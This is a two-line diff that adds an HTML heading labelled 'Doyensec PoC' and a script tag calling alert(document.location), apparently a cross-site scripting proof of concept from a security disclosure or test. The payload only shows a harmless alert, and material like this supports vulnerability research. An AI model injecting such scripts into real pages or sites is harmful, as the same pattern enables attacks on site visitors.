@@ -1,0 +1,2 @@
+<h1>Doyensec PoC</h1>	
+<script>alert(document.location)</script>
